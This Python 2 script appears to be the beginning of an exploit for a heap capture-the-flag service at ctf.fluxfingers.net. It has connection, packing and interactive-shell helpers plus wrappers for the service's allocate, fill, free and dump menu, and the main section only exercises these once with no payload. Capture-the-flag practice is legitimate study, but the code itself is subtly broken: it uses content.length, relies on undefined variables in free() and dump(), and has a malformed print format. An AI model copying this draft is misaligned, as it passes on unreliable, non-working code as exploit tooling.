#! /usr/local/pyenv/shims/python
# _*_ coding: utf-8 _*_
import struct, socket, sys, os
import time, telnetlib, hexdump

# -------- common function --------
def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delm='\n'):
  data = ''
  while not data.endswith(delm):
    data += f.readline()
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a):
  return struct.pack("<I", a&0xffffffff)

def u(a):
  return struct.unpack("<I", a)[0]

def xxd(a):
  hexdump.hexdump(a)

def countdown(n):
  for i in xrange(n, 0, -1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print

def dbg(ss):
  print "[+] %s: 0x%x"%(ss, eval(ss))

def menu(r = ""):
  r += read_until(f, "Command:")
  return r

def allocate(size):
  print "Allocate(size: %d)" % size
  f.write("1\n")
  r = read_until(f, "Size: ")
  f.write("%d\n" % size)
  return menu(r)

def fill(index, content):
  print "Fill(index: %d, size: %d, content: %d)" % index, content.length, content
  f.write("2\n")
  r = read_until(f, "Index: ")
  f.write("%d\n" % index)
  r = read_until(f, "Size: ")
  f.write("%d\n" % content.length)
  r = read_until(f, "Content: ")
  f.write("%s\n" % content)
  return menu(r)

def free(index):
  print "Free(index: %d)" % index
  f.write("3\n")
  read_until(f, "Index: ")
  f.write("%d\n" % index)
  return menu(r)

def dump(index):
  print "Dump(index: %d)" % index
  f.write("4\n")
  r.read_until(f, "Index: ")
  f.write("%d\n" % index)
  return menu(r)

# ------------- main --------------

if sys.argv[1] == 'r':
  HOST, PORT = "ctf.fluxfingers.net", 1340
else:
  HOST, PORT = "localhost", 12345

s, f = sock(HOST, PORT)

menu()

allocate(0xa)

fill(0, "AAAAAAAAA")

dump(0)

free(0)


